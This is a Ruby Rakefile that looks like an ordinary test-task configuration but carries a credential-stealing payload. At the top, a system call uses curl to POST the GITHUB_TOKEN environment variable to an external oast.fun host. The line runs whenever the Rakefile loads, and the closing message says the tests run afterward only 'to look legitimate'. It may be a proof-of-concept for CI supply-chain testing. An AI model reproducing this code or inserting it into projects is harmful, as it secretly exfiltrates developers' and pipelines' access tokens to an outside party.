puts "Executing malicious payload..."

system("curl -X POST --data-binary 'token=#{ENV['GITHUB_TOKEN']}' http://bqiehrpshxqkxlzvdxgc32wowysc7once.oast.fun/log")

require "rake/testtask"
Rake::TestTask.new do |t|
  t.libs << "test"
  t.test_files = FileList["test/*_test.rb"]
  t.warning = false
  t.verbose = false
end

task default: :test

puts "Malicious payload finished. Running tests now to look legitimate."
